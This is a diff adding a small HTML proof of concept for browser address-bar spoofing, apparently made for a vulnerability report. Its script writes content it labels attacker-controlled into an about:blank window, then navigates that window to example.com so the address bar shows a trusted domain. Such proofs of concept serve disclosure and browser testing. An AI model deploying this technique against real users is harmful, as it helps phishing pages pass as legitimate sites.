@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Address Bar Spoof PoC</title>
+</head>
+
+<body>
+  <h3>Address Bar Spoofing PoC</h3>
+  <button onclick="spoof()">Open</button>
+
+<script>
+let w;
+
+function spoof() {
+  // 1. Open controlled window
+  w = window.open("about:blank", "spoof");
+
+  // 2. Write attacker-controlled content
+  w.document.write(`
+    <h2>This page is NOT example.com</h2>
+    <p>Content is attacker-controlled</p>
+    <p>Please observe the address bar</p>
+  `);
+
+  // 3. Trigger navigation to target domain
+  setTimeout(() => {
+    w.location.href = "https://example.com";
+  }, 100);
+}
+</script>
+</body>
+</html>
